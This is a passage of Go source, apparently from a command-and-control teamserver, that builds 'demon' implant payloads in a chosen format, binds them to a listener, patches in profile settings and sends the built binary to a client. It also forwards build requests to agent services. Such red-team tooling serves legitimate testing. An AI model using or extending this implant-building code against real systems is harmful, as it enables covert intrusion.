						PayloadBuilder.SetFormat(builder.FILETYPE_WINDOWS_RAW_BINARY)
						Ext += ".bin"
					} else {
						logger.Error("Unknown Format: " + Format)
						return
					}

					for i := 0; i < len(t.Listeners); i++ {
						if t.Listeners[i].Name == ListenerName {
							PayloadBuilder.SetListener(t.Listeners[i].Type, t.Listeners[i].Config)
						}
					}

					PayloadBuilder.SetExtension(Ext)

					if t.Profile.Config.Demon != nil && t.Profile.Config.Demon.Binary != nil {
						PayloadBuilder.SetPatchConfig(t.Profile.Config.Demon.Binary)
					}

					if PayloadBuilder.Build() {
						pal := PayloadBuilder.GetPayloadBytes()
						if len(pal) > 0 {
							err := t.SendEvent(PayloadBuilder.ClientId, events.Gate.SendStageless("demon"+Ext, pal))
							if err != nil {
								logger.Error("Error while sending event: " + err.Error())
								return
							}
							PayloadBuilder.DeletePayload()
						}
					}
				}()
			} else {
				// send to Services
				for _, Agent := range t.Service.Agents {
					if Agent.Name == AgentType {
						var ConfigMap = make(map[string]any)

						err := json.Unmarshal([]byte(Config), &ConfigMap)
						if err != nil {
							logger.Error("Failed to Unmarshal json to object: " + err.Error())
							SendConsoleMsg("Error", "Failed to Unmarshal json to object: "+err.Error())
							return
						}

						var Options = map[string]any{
							"Listener": t.ListenerGetInfo(ListenerName),
							"Arch":     Arch,
							"Format":   Format,
						}

						Agent.SendAgentBuildRequest(ClientID, ConfigMap, Options)
					}
				}

			}
		}
	}
}
